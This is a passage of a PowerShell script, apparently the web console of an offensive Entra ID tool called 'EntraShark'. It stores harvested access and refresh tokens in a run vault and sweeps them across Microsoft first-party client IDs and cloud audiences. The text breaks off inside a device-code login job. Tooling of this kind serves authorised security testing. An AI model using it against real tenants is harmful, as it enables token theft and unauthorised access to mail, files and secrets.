[CmdletBinding()]
param(
    [string]$TenantId,
    [int]$Port = 8766,
    [string]$OutputRoot,
    [switch]$NoBrowser,
    [switch]$ResumeLastRun
)

$ErrorActionPreference = 'Continue'

$script:Root = $PSScriptRoot
if (-not $script:Root) {
    $script:Root = Split-Path -Parent $MyInvocation.MyCommand.Path
}
if (-not $OutputRoot) {
    $OutputRoot = Join-Path $script:Root 'out'
}
$script:ModulePath = Join-Path $script:Root 'EntraShark.psd1'
$script:ActiveRun = $null
$script:TenantId = $TenantId
$script:Jobs = @{}
$script:ClientAliases = [ordered]@{
    office        = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
    teams         = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'
    msgraphps     = '14d82eec-204b-4c2f-b7e8-296a70dab67e'
    graphps       = '14d82eec-204b-4c2f-b7e8-296a70dab67e'
    authbroker    = '29d9ed98-a469-4536-ade2-f981bc1d605e'
    authenticator = '4813382a-8fa7-425e-ab75-3b753aab3abb'
    outlook       = '27922004-5251-4030-b22d-91ecd9a37ea4'
    onedrive      = 'ab9b8c07-8f02-4f72-87fa-80105867a763'
    intune        = '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'
    vs            = '872cd9fa-d31f-45e0-9eab-6e460a02d1f1'
    visualstudio  = '872cd9fa-d31f-45e0-9eab-6e460a02d1f1'
    officepwa     = '0ec893e0-5785-4de6-99da-4ed124e5296c'
    accountsui    = 'a40d7d7d-59aa-447e-a655-679a4107e548'
    az            = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'
    azcli         = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'
    azureps       = '1950a258-227b-4e31-a9cf-717495945fc2'
    msol          = '1b730954-1685-4b74-9bfd-dac224a7b894'
    aadps         = '1b730954-1685-4b74-9bfd-dac224a7b894'
}
$script:ResourceAliases = [ordered]@{
    msgraph      = 'https://graph.microsoft.com'
    graph        = 'https://graph.microsoft.com'
    aadgraph     = 'https://graph.windows.net'
    arm          = 'https://management.azure.com'
    asm          = 'https://management.core.windows.net'
    vault        = 'https://vault.azure.net'
    keyvault     = 'https://vault.azure.net'
    storage      = 'https://storage.azure.com'
    sql          = 'https://database.windows.net'
    outlook      = 'https://outlook.office.com'
    exo          = 'https://outlook.office365.com'
    substrate    = 'https://substrate.office.com'
    powerbi      = 'https://analysis.windows.net/powerbi/api'
    powerbidax   = 'https://analysis.windows.net/powerbi/api'
    flow         = 'https://service.flow.microsoft.com'
    fabric       = 'https://api.fabric.microsoft.com'
    partner      = 'https://api.partnercenter.microsoft.com'
    spaces       = 'https://api.spaces.skype.com'
    appinsights  = 'https://api.applicationinsights.io'
    loganalytics = 'https://api.loganalytics.io'
    defender     = 'https://api.security.microsoft.com'
    devops       = '499b84ac-1321-427f-aa17-267ca6975798'
    intune       = '0000000a-0000-0000-c000-000000000000'
    aadgraphguid = '00000002-0000-0000-c000-000000000000'
    msgraphguid  = '00000003-0000-0000-c000-000000000000'
    armguid      = '797f4846-ba00-4fd7-ba43-dac1f8f63013'
    exoguid      = '00000002-0000-0ff1-ce00-000000000000'
    spoguid      = '00000003-0000-0ff1-ce00-000000000000'
    officeapps   = 'https://officeapps.live.com'
    officemgmt   = 'https://manage.office.com'
    yammer       = 'https://www.yammer.com'
    mam          = 'https://wip.mam.manage.microsoft.com'
}
$script:ClientDescriptions = [ordered]@{
    'd3590ed6-52b3-4102-aeff-aad2292ab01c' = 'Microsoft Office'
    '1fec8e78-bce4-4aaf-ab1b-5451cc387264' = 'Microsoft Teams'
    '14d82eec-204b-4c2f-b7e8-296a70dab67e' = 'Microsoft Graph PowerShell SDK'
    '29d9ed98-a469-4536-ade2-f981bc1d605e' = 'Microsoft Authentication Broker'
    '4813382a-8fa7-425e-ab75-3b753aab3abb' = 'Microsoft Authenticator App'
    '27922004-5251-4030-b22d-91ecd9a37ea4' = 'Outlook Mobile iOS'
    'ab9b8c07-8f02-4f72-87fa-80105867a763' = 'OneDrive iOS'
    '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223' = 'Intune Company Portal'
    '872cd9fa-d31f-45e0-9eab-6e460a02d1f1' = 'Visual Studio'
    '0ec893e0-5785-4de6-99da-4ed124e5296c' = 'Office UWP PWA'
    'a40d7d7d-59aa-447e-a655-679a4107e548' = 'Accounts Control UI'
    '04b07795-8ddb-461a-bbee-02f9e1bf7b46' = 'Azure CLI'
    '1950a258-227b-4e31-a9cf-717495945fc2' = 'Azure PowerShell'
    '1b730954-1685-4b74-9bfd-dac224a7b894' = 'AzureAD PowerShell / MSOnline'
    '00b41c95-dab0-4487-9791-b9d2c32c80f2' = 'Office 365 Management'
    '00000003-0000-0ff1-ce00-000000000000' = 'SharePoint Online'
    'de8bc8b5-d9f9-48b1-a8ad-b748da725064' = 'Graph Explorer'
    'fb78d390-0c51-40cd-8e17-fdbfab77341b' = 'Microsoft Exchange REST API'
}
$script:ResourceDescriptions = [ordered]@{
    'https://graph.microsoft.com'              = 'Microsoft Graph'
    'https://graph.windows.net'                = 'Azure AD Graph'
    'https://management.azure.com'             = 'Azure Resource Manager'
    'https://management.core.windows.net'      = 'Azure Service Management'
    'https://vault.azure.net'                  = 'Azure Key Vault'
    'https://storage.azure.com'                = 'Azure Storage'
    'https://database.windows.net'             = 'Azure SQL'
    'https://outlook.office.com'               = 'Outlook / Exchange Online'
    'https://outlook.office365.com'            = 'Outlook / Exchange Online alternate audience'
    'https://substrate.office.com'             = 'M365 Substrate'
    'https://analysis.windows.net/powerbi/api' = 'Power BI Service / REST API / DAX executeQueries'
    'https://service.flow.microsoft.com'       = 'Power Automate'
    'https://api.fabric.microsoft.com'         = 'Microsoft Fabric'
    'https://api.partnercenter.microsoft.com'  = 'Partner Center'
    'https://api.spaces.skype.com'             = 'Skype / Teams Spaces'
    'https://api.applicationinsights.io'       = 'Application Insights'
    'https://api.loganalytics.io'              = 'Log Analytics'
    'https://api.security.microsoft.com'       = 'Microsoft Defender XDR'
    'https://officeapps.live.com'              = 'Office Apps Live'
    'https://manage.office.com'                = 'Office Management API'
    'https://www.yammer.com'                   = 'Yammer / Viva Engage'
    'https://wip.mam.manage.microsoft.com'     = 'Intune MAM'
    '499b84ac-1321-427f-aa17-267ca6975798'     = 'Azure DevOps'
    '0000000a-0000-0000-c000-000000000000'     = 'Intune Graph'
    '00000002-0000-0000-c000-000000000000'     = 'Azure AD Graph GUID'
    '00000003-0000-0000-c000-000000000000'     = 'Microsoft Graph GUID'
    '797f4846-ba00-4fd7-ba43-dac1f8f63013'     = 'Azure Resource Manager GUID'
    '00000002-0000-0ff1-ce00-000000000000'     = 'Exchange Online GUID'
    '00000003-0000-0ff1-ce00-000000000000'     = 'SharePoint Online GUID'
}
$script:SweepAudiences = @(
    [ordered]@{ key='msgraph'; name='Microsoft Graph'; resource='https://graph.microsoft.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='graphTokens'; cae=$true },
    [ordered]@{ key='aadgraph'; name='Azure AD Graph legacy'; resource='https://graph.windows.net'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='aadGraphTokens'; cae=$false },
    [ordered]@{ key='arm'; name='Azure Resource Manager'; resource='https://management.azure.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='armTokens'; cae=$true },
    [ordered]@{ key='asm'; name='Azure Service Management'; resource='https://management.core.windows.net'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='asmTokens'; cae=$false },
    [ordered]@{ key='outlook'; name='Outlook / Exchange Online'; resource='https://outlook.office.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='outlookTokens'; cae=$true },
    [ordered]@{ key='substrate'; name='M365 Substrate'; resource='https://substrate.office.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='substrateTokens'; cae=$true },
    [ordered]@{ key='teams'; name='Microsoft Teams'; resource='https://api.spaces.skype.com'; clientId='1fec8e78-bce4-4aaf-ab1b-5451cc387264'; outVar='teamsTokens'; cae=$true },
    [ordered]@{ key='officeapps'; name='Office Apps'; resource='https://officeapps.live.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='officeAppsTokens'; cae=$false },
    [ordered]@{ key='officemgmt'; name='Office Management API'; resource='https://manage.office.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='officeMgmtTokens'; cae=$false },
    [ordered]@{ key='vault'; name='Azure Key Vault'; resource='https://vault.azure.net'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='vaultTokens'; cae=$false },
    [ordered]@{ key='storage'; name='Azure Storage'; resource='https://storage.azure.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='storageTokens'; cae=$false },
    [ordered]@{ key='powerbi'; name='Power BI Service'; resource='https://analysis.windows.net/powerbi/api'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='powerbiTokens'; cae=$false },
    [ordered]@{ key='flow'; name='Power Automate'; resource='https://service.flow.microsoft.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='flowTokens'; cae=$false },
    [ordered]@{ key='fabric'; name='Microsoft Fabric'; resource='https://api.fabric.microsoft.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='fabricTokens'; cae=$false },
    [ordered]@{ key='defender'; name='Microsoft Defender XDR'; resource='https://api.security.microsoft.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='defenderTokens'; cae=$false },
    [ordered]@{ key='intune'; name='Intune Service'; resource='0000000a-0000-0000-c000-000000000000'; clientId='9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'; outVar='intuneTokens'; cae=$false },
    [ordered]@{ key='mam'; name='Intune MAM'; resource='https://wip.mam.manage.microsoft.com'; clientId='9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'; outVar='mamTokens'; cae=$false },
    [ordered]@{ key='yammer'; name='Yammer / Viva Engage'; resource='https://www.yammer.com'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='yammerTokens'; cae=$false },
    [ordered]@{ key='sql'; name='Azure SQL'; resource='https://database.windows.net'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='sqlTokens'; cae=$false },
    [ordered]@{ key='devops'; name='Azure DevOps'; resource='499b84ac-1321-427f-aa17-267ca6975798'; clientId='d3590ed6-52b3-4102-aeff-aad2292ab01c'; outVar='devopsTokens'; cae=$false }
)
$script:DefaultTokenNames = @(
    'tokens','graphTokens','aadGraphTokens','armTokens','outlookTokens','teamsTokens',
    'officeAppsTokens','officeMgmtTokens','vaultTokens','storageTokens','powerbiTokens',
    'flowTokens','fabricTokens','defenderTokens','intuneTokens','mamTokens','yammerTokens',
    'sqlTokens','devopsTokens','LastSweepResults'
)

Import-Module $script:ModulePath -Force

foreach ($dir in @($OutputRoot)) {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
    }
}

function ConvertTo-JsonText {
    param($Object, [int]$Depth = 40)
    return ($Object | ConvertTo-Json -Depth $Depth)
}

function Send-Response {
    param($Response, [string]$Text, [string]$ContentType = 'application/json', [int]$StatusCode = 200)
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes($Text)
        $reason = switch ($StatusCode) {
            200 { 'OK' }
            404 { 'Not Found' }
            500 { 'Internal Server Error' }
            default { 'OK' }
        }
        $header = "HTTP/1.1 $StatusCode $reason`r`nContent-Type: $ContentType; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nConnection: close`r`n`r`n"
        $headerBytes = [Text.Encoding]::ASCII.GetBytes($header)
        $Response.Stream.Write($headerBytes, 0, $headerBytes.Length)
        $Response.Stream.Write($bytes, 0, $bytes.Length)
        $Response.Stream.Flush()
    } catch [System.IO.IOException] {
        Write-Host "[EntraShark] Client disconnected before response completed: $($_.Exception.Message)" -ForegroundColor DarkGray
    } catch [System.ObjectDisposedException] {
        Write-Host "[EntraShark] Client connection already closed." -ForegroundColor DarkGray
    } finally {
        try { $Response.Client.Close() } catch {}
    }
}

function Read-Body {
    param($Request)
    $raw = $Request.Body
    if (-not $raw) { return [pscustomobject]@{} }
    try { return $raw | ConvertFrom-Json } catch { return [pscustomobject]@{} }
}

function ConvertFrom-QueryString {
    param([string]$Query)
    $result = @{}
    if (-not $Query) { return $result }
    foreach ($pair in $Query.TrimStart('?').Split('&')) {
        if (-not $pair) { continue }
        $parts = $pair.Split('=', 2)
        $key = [Uri]::UnescapeDataString($parts[0])
        $value = if ($parts.Count -gt 1) { [Uri]::UnescapeDataString($parts[1].Replace('+',' ')) } else { '' }
        $result[$key] = $value
    }
    return $result
}

function Read-HttpRequest {
    param([Net.Sockets.TcpClient]$Client)

    $stream = $Client.GetStream()
    $reader = [IO.StreamReader]::new($stream, [Text.Encoding]::UTF8, $false, 1024, $true)
    $requestLine = $reader.ReadLine()
    if (-not $requestLine) { return $null }
    $parts = $requestLine.Split(' ')
    $method = $parts[0]
    $target = $parts[1]
    $headers = @{}
    while ($true) {
        $line = $reader.ReadLine()
        if ($null -eq $line -or $line -eq '') { break }
        $idx = $line.IndexOf(':')
        if ($idx -gt 0) {
            $headers[$line.Substring(0,$idx).Trim().ToLowerInvariant()] = $line.Substring($idx + 1).Trim()
        }
    }

    $body = ''
    $contentLength = 0
    if ($headers.ContainsKey('content-length')) { [void][int]::TryParse($headers['content-length'], [ref]$contentLength) }
    if ($contentLength -gt 0) {
        $buffer = New-Object char[] $contentLength
        $read = 0
        while ($read -lt $contentLength) {
            $n = $reader.Read($buffer, $read, $contentLength - $read)
            if ($n -le 0) { break }
            $read += $n
        }
        $body = -join $buffer[0..($read - 1)]
    }

    $uri = [Uri]("http://127.0.0.1$target")
    [pscustomobject]@{
        HttpMethod  = $method
        Url         = $uri
        QueryString = ConvertFrom-QueryString -Query $uri.Query
        Headers     = $headers
        Body        = $body
        Client      = $Client
        Stream      = $stream
    }
}

function Get-ToolPath {
    param([Parameter(Mandatory)][string]$Name)
    $local = Join-Path (Join-Path $script:Root 'Tools') $Name
    if (Test-Path -LiteralPath $local) { return $local }
    $external = Join-Path 'C:\Users\brad\JOBS\2026\Avondale\graphrunner\CustomScripts' $Name
    if (Test-Path -LiteralPath $external) { return $external }
    throw "Could not find helper script $Name"
}

function Get-RunTokenVaultPath {
    param([string]$Run)
    if (-not $Run) { return $null }
    $tokenDir = Join-Path $Run 'tokens'
    if (-not (Test-Path -LiteralPath $tokenDir)) {
        New-Item -ItemType Directory -Force -Path $tokenDir | Out-Null
    }
    return (Join-Path $tokenDir 'tokens.json')
}

function Get-ActiveTokenVaultPath {
    $run = Get-CurrentRun
    if (-not $run) { return $null }
    return Get-RunTokenVaultPath -Run $run
}

function Read-TokenVault {
    param([string]$Path)
    if (-not $Path) { $Path = Get-ActiveTokenVaultPath }
    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return [ordered]@{} }
    try {
        $raw = Get-Content -LiteralPath $Path -Raw
        if (-not $raw) { return [ordered]@{} }
        $obj = $raw | ConvertFrom-Json
        $vault = [ordered]@{}
        foreach ($p in $obj.PSObject.Properties) { $vault[$p.Name] = $p.Value }
        return $vault
    } catch {
        return [ordered]@{}
    }
}

function Write-TokenVault {
    param($Vault, [string]$Path)
    if (-not $Path) { $Path = Get-ActiveTokenVaultPath }
    if (-not $Path) { throw 'No current run is selected. Create or load a run before storing tokens.' }
    $parent = Split-Path -Parent $Path
    if (-not (Test-Path -LiteralPath $parent)) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    $Vault | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $Path -Encoding UTF8
}

function Resolve-ConsoleAlias {
    param([string]$Value, $Map)
    if (-not $Value) { return $Value }
    $key = $Value.ToLowerInvariant()
    if ($Map.Contains($key)) { return $Map[$key] }
    return $Value
}

function Get-KnownTokenNames {
    $vault = Read-TokenVault
    $names = New-Object System.Collections.Generic.List[string]
    foreach ($name in $script:DefaultTokenNames) { $names.Add($name) | Out-Null }
    foreach ($key in $vault.Keys) { $names.Add($key) | Out-Null }
    Get-Variable -Scope Global -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -eq 'tokens' -or $_.Name -match '(?i)Tokens$' } |
        ForEach-Object { $names.Add($_.Name) | Out-Null }
    [Environment]::GetEnvironmentVariables('Process').Keys |
        Where-Object { $_ -eq 'tokens' -or $_ -match '(?i)Tokens$' } |
        ForEach-Object { $names.Add([string]$_) | Out-Null }
    return @($names.ToArray() | Where-Object { $_ } | Select-Object -Unique)
}

function Get-ConsoleTokenVariable {
    param([string]$Name)
    $v = Get-Variable -Name $Name -Scope Global -ValueOnly -ErrorAction SilentlyContinue
    if ($v) { return $v }
    $v = Get-Variable -Name $Name -Scope Script -ValueOnly -ErrorAction SilentlyContinue
    if ($v) { return $v }
    $envValue = [Environment]::GetEnvironmentVariable($Name, 'Process')
    if ($envValue) {
        try { return ($envValue | ConvertFrom-Json) } catch { return $envValue }
    }
    return $null
}

function ConvertTo-TokenSummary {
    param([string]$Name, [object]$Value, [string]$Source)
    try {
        $token = Get-EntraSharkToken -Token $Value -VariableName ''
        if ($token) {
            $now = Get-Date
            $expiresLocal = $token.ExpiresLocal
            $expiresIn = if ($expiresLocal) { [int][Math]::Floor(($expiresLocal - $now).TotalSeconds) } else { $null }
            $isExpired = if ($expiresLocal) { $expiresLocal -le $now } else { $false }
            return [ordered]@{
                name            = $Name
                source          = $Source
                user            = $token.User
                tenantId        = $token.TenantId
                audience        = $token.Audience
                appId           = $token.AppId
                expires         = if ($expiresLocal) { $expiresLocal.ToString('s') } else { $null }
                expiresInSeconds = $expiresIn
                isExpired       = $isExpired
                scopes          = $token.Scopes
                roles           = $token.Roles
                hasRefreshToken = [bool]$token.RefreshToken
                canRefresh      = [bool]$token.RefreshToken
                accessTokenPreview = if ($token.AccessToken -and $token.AccessToken.Length -gt 24) { $token.AccessToken.Substring(0,12) + '...' + $token.AccessToken.Substring($token.AccessToken.Length - 8) } else { $null }
                claims          = $token.Claims
            }
        }
    } catch {}
    return $null
}

function Get-TokenInventory {
    $vault = Read-TokenVault
    $summary = [ordered]@{}
    foreach ($key in Get-KnownTokenNames) {
        if ($vault.Contains($key)) {
            $entry = ConvertTo-TokenSummary -Name $key -Value $vault[$key] -Source 'run-vault'
            if ($entry) {
                $summary[$key] = $entry
            } else {
                $summary[$key] = [ordered]@{ name=$key; source='run-vault'; status='No usable access_token in current run token vault' }
            }
            continue
        }

        $envValue = Get-ConsoleTokenVariable -Name $key
        if ($envValue) {
            $entry = ConvertTo-TokenSummary -Name $key -Value $envValue -Source 'environment-only'
            if ($entry) {
                $summary[$key] = $entry
                $summary[$key].status = 'Environment token is visible to this console but is not stored in the current run.'
            }
        }
    }
    return $summary
}

function Get-TokenSummary {
    return Get-TokenInventory
}

function Get-RunUserSummary {
    param([string]$Run, $Tokens)
    if (-not $Tokens) { return $null }
    $items = @($Tokens.Keys | ForEach-Object { $Tokens[$_] })
    $token = @($items | Where-Object { $_.audience -match 'graph\.microsoft\.com' -and $_.user } | Select-Object -First 1)
    if (-not $token) { $token = @($items | Where-Object { $_.user } | Select-Object -First 1) }
    if (-not $token) { return $null }

    $profile = $null
    if ($Run) {
        $usersCsv = Join-Path (Join-Path $Run 'evidence') 'users.csv'
        if (Test-Path -LiteralPath $usersCsv) {
            try {
                $profile = @(Import-Csv -LiteralPath $usersCsv | Where-Object {
                    ($token.user -and ($_.userPrincipalName -eq $token.user -or $_.mail -eq $token.user -or $_.id -eq $token.user))
                } | Select-Object -First 1)
            } catch {}
        }
    }

    return [ordered]@{
        user = $token.user
        tenantId = $token.tenantId
        audience = $token.audience
        appId = $token.appId
        scopes = $token.scopes
        roles = $token.roles
        expires = $token.expires
        isExpired = $token.isExpired
        displayName = if ($profile) { $profile.displayName } else { $null }
        objectId = if ($profile) { $profile.id } else { $null }
        mail = if ($profile) { $profile.mail } else { $null }
        jobTitle = if ($profile) { $profile.jobTitle } else { $null }
        department = if ($profile) { $profile.department } else { $null }
        accountEnabled = if ($profile) { $profile.accountEnabled } else { $null }
    }
}

function Get-CurrentRun {
    return $script:ActiveRun
}

function Set-CurrentRun {
    param([string]$Path)
    $script:ActiveRun = $Path
}

function Get-RunTaskRoot {
    param([string]$Run)
    if (-not $Run) { return $null }
    $taskRoot = Join-Path $Run 'tasks'
    if (-not (Test-Path -LiteralPath $taskRoot)) {
        New-Item -ItemType Directory -Force -Path $taskRoot | Out-Null
    }
    return $taskRoot
}

function ConvertTo-SafeRunName {
    param([string]$Name)
    if (-not $Name -or -not $Name.Trim()) {
        return ("console-" + (Get-Date -Format 'yyyyMMdd-HHmmss'))
    }
    $safe = $Name.Trim()
    $safe = $safe -replace '[<>:"/\\|?*\x00-\x1F]', '-'
    $safe = $safe -replace '\s+', '-'
    $safe = $safe -replace '-{2,}', '-'
    $safe = $safe.Trim('.','-',' ')
    if (-not $safe) { throw 'Run name contains no usable folder-safe characters.' }
    if ($safe -eq '.' -or $safe -eq '..' -or $safe.Contains('..')) { throw 'Run name cannot contain path traversal sequences.' }
    if ($safe.Length -gt 96) { $safe = $safe.Substring(0, 96).Trim('.','-',' ') }
    return $safe
}

function New-ConsoleRun {
    param([string]$Name)
    $runName = ConvertTo-SafeRunName -Name $Name
    $run = Join-Path $OutputRoot $runName
    if (Test-Path -LiteralPath $run) {
        throw "Run folder already exists: $run"
    }
    New-Item -ItemType Directory -Force -Path $run | Out-Null
    foreach ($child in @('raw','evidence','tokens','tasks')) {
        New-Item -ItemType Directory -Force -Path (Join-Path $run $child) | Out-Null
    }
    Set-CurrentRun -Path $run
    return [ordered]@{
        currentRun = $run
        runName = $runName
        tokenVault = (Get-RunTokenVaultPath -Run $run)
        taskRoot = (Get-RunTaskRoot -Run $run)
        created = $true
    }
}

function Set-RequestProperty {
    param($Object, [string]$Name, $Value)
    if ($Object.PSObject.Properties[$Name]) {
        $Object.$Name = $Value
    } else {
        $Object | Add-Member -NotePropertyName $Name -NotePropertyValue $Value
    }
}

function Normalize-AuthRequest {
    param($Auth)
    $client = if ($Auth.clientId) { [string]$Auth.clientId } else { 'office' }
    $resource = if ($Auth.resource) { [string]$Auth.resource } else { 'msgraph' }
    Set-RequestProperty -Object $Auth -Name resolvedClientId -Value (Resolve-ConsoleAlias -Value $client -Map $script:ClientAliases)
    Set-RequestProperty -Object $Auth -Name resolvedResource -Value (Resolve-ConsoleAlias -Value $resource -Map $script:ResourceAliases)
    if (-not $Auth.outVar) {
        $defaultOut = if ($resource -match 'arm|management\.azure|797f') { 'armTokens' } elseif ($resource -match 'teams|spaces') { 'teamsTokens' } else { 'tokens' }
        Set-RequestProperty -Object $Auth -Name outVar -Value $defaultOut
    }
    return $Auth
}

function Normalize-RefreshRequest {
    param($Refresh)
    if (-not $Refresh.inputVar) { Set-RequestProperty -Object $Refresh -Name inputVar -Value 'tokens' }
    if (-not $Refresh.clientId) { Set-RequestProperty -Object $Refresh -Name clientId -Value 'office' }
    if (-not $Refresh.resource) { Set-RequestProperty -Object $Refresh -Name resource -Value 'msgraph' }
    if (-not $Refresh.outVar -and $Refresh.mode -eq 'single') {
        $resource = [string]$Refresh.resource
        $outVar = if ($resource -match 'arm|management\.azure|797f') { 'armTokens' } elseif ($resource -match 'teams|spaces') { 'teamsTokens' } else { "$resource`Tokens" }
        $outVar = ($outVar -replace '[^A-Za-z0-9_]', '')
        Set-RequestProperty -Object $Refresh -Name outVar -Value $outVar
    }
    return $Refresh
}

function Get-ConsoleOptions {
    [ordered]@{
        clients = @($script:ClientAliases.GetEnumerator() | ForEach-Object { [ordered]@{ alias=$_.Key; value=$_.Value; name=$script:ClientDescriptions[$_.Value] } })
        resources = @($script:ResourceAliases.GetEnumerator() | ForEach-Object { [ordered]@{ alias=$_.Key; value=$_.Value; name=$script:ResourceDescriptions[$_.Value] } })
        sweepAudiences = @($script:SweepAudiences)
        tokenNames = @(Get-KnownTokenNames)
        devices = @('Windows','Mac','Linux','AndroidMobile','iPhone','OS/2')
        browsers = @('Edge','Chrome','Firefox','Safari','IE','Android')
    }
}

function New-Task {
    param([string]$Kind)
    $taskRoot = Get-RunTaskRoot -Run (Get-CurrentRun)
    if (-not $taskRoot) { throw 'No current run is selected. Create or load a run first.' }
    $id = ([guid]::NewGuid()).ToString('n')
    $dir = Join-Path $taskRoot $id
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    $task = [ordered]@{
        id        = $id
        kind      = $Kind
        state     = 'queued'
        started   = $null
        completed = $null
        message   = 'Queued'
        result    = $null
        error     = $null
        dir       = $dir
    }
    Write-Task -Task $task
    return $task
}

function Write-Task {
    param([hashtable]$Task)
    $path = Join-Path $Task.dir 'task.json'
    $Task | ConvertTo-Json -Depth 30 | Set-Content -LiteralPath $path -Encoding UTF8
}

function Read-Task {
    param([string]$Id)
    $taskRoot = Get-RunTaskRoot -Run (Get-CurrentRun)
    if (-not $taskRoot) { return $null }
    $path = Join-Path (Join-Path $taskRoot $Id) 'task.json'
    if (-not (Test-Path -LiteralPath $path)) { return $null }
    try { return (Get-Content -LiteralPath $path -Raw | ConvertFrom-Json) } catch { return $null }
}

function Get-TaskLog {
    param([string]$Id)
    $taskRoot = Get-RunTaskRoot -Run (Get-CurrentRun)
    if (-not $taskRoot) { return @() }
    $dir = Join-Path $taskRoot $Id
    $log = Join-Path $dir 'status.jsonl'
    if (-not (Test-Path -LiteralPath $log)) { return @() }
    return @(Get-Content -LiteralPath $log -Tail 300 | ForEach-Object {
        try { $_ | ConvertFrom-Json } catch { [pscustomobject]@{ timestamp = $null; message = $_ } }
    })
}

function Start-ManagedTask {
    param(
        [string]$Kind,
        [scriptblock]$ScriptBlock,
        [object[]]$ArgumentList
    )
    $tokenVaultPath = Get-ActiveTokenVaultPath
    if (-not $tokenVaultPath) {
        throw 'No current run is selected. Use Overview to load an existing run or start a new run before authentication, refresh, recon, or modules.'
    }
    $task = New-Task -Kind $Kind
    $runPointer = Join-Path $task.dir 'current-run.txt'
    (Get-CurrentRun) | Set-Content -LiteralPath $runPointer -Encoding UTF8
    $args = @($task, $script:ModulePath, $tokenVaultPath, $runPointer, $OutputRoot) + @($ArgumentList)
    $job = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $args
    $script:Jobs[$task.id] = $job
    return $task
}

function Get-TaskStatus {
    param([string]$Id)
    $task = Read-Task -Id $Id
    if (-not $task) { return [ordered]@{ ok = $false; error = 'Unknown task' } }
    $job = $script:Jobs[$Id]
    if ($job) {
        $task | Add-Member -NotePropertyName jobState -NotePropertyValue $job.State -Force
        if ($job.State -in @('Completed','Failed','Stopped')) {
            Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
            $script:Jobs.Remove($Id)
        }
    }
    return [ordered]@{ ok = $true; task = $task; log = Get-TaskLog -Id $Id }
}

$deviceCodeAuthJob = {
    param($Task, $ModulePath, $TokenVaultPath, $CurrentRunPath, $OutputRoot, $Auth)
    Import-Module $ModulePath -Force
    function SaveTask($t) { $t | ConvertTo-Json -Depth 30 | Set-Content -LiteralPath (Join-Path $t.dir 'task.json') -Encoding UTF8 }
    function Log($msg, $data=$null) {
        [pscustomobject]@{ timestamp=(Get-Date).ToString('o'); message=$msg; data=$data } |
            ConvertTo-Json -Depth 20 -Compress | Add-Content -LiteralPath (Join-Path $Task.dir 'status.jsonl') -Encoding UTF8
    }
    function SaveVault($vault) {
        $parent = Split-Path -Parent $TokenVaultPath
        if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Force -Path $parent | Out-Null }
        $vault | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $TokenVaultPath -Encoding UTF8
    }
    function ReadVault {
        if (-not (Test-Path -LiteralPath $TokenVaultPath)) { return [ordered]@{} }
        $raw = Get-Content -LiteralPath $TokenVaultPath -Raw
        if (-not $raw) { return [ordered]@{} }
        $obj = $raw | ConvertFrom-Json
        $h = [ordered]@{}
        foreach ($p in $obj.PSObject.Properties) { $h[$p.Name] = $p.Value }
        return $h
    }

    $Task.state = 'running'; $Task.started = (Get-Date).ToString('o'); $Task.message = 'Requesting device code'; SaveTask $Task
    try {
        $tenant = if ($Auth.tenantId) { $Auth.tenantId } elseif ($Auth.tenant) { $Auth.tenant } else { 'common' }
        $clientId = if ($Auth.resolvedClientId) { $Auth.resolvedClientId } elseif ($Auth.clientId) { $Auth.clientId } else { 'd3590ed6-52b3-4102-aeff-aad2292ab01c' }
        $resource = if ($Auth.resolvedResource) { $Auth.resolvedResource } elseif ($Auth.resource) { $Auth.resource } else { 'https://graph.microsoft.com' }
        $outVar = if ($Auth.outVar) { $Auth.outVar } else { 'tokens' }
        $useV1 = [bool]$Auth.useV1Endpoint
        if (-not $useV1 -and ($resource -match 'graph\.windows\.net' -or $resource -match 'management\.core\.windows\.net')) {
            $useV1 = $true
            Log 'Resource requires legacy v1 OAuth endpoint; switching endpoint automatically.'
        }
        if ($useV1) {
            $deviceUri = "https://login.microsoftonline.com/$tenant/oauth2/devicecode?api-version=1.0"
            $tokenUri = "https://login.microsoftonline.com/$tenant/oauth2/token"
            $body = @{ client_id = $clientId; resource = $resource }
        } else {
            $scopeItems = if ($Auth.scope) { @([string]$Auth.scope -split '\s+' | Where-Object { $_ }) } else { @('.default','offline_access','openid','profile') }
            $effectiveScope = @($scopeItems | ForEach-Object { if ($_ -eq '.default') { "$resource/.default" } else { $_ } }) -join ' '
            $deviceUri = "https://login.microsoftonline.com/$tenant/oauth2/v2.0/devicecode"
            $tokenUri = "https://login.microsoftonline.com/$tenant/oauth2/v2.0/token"
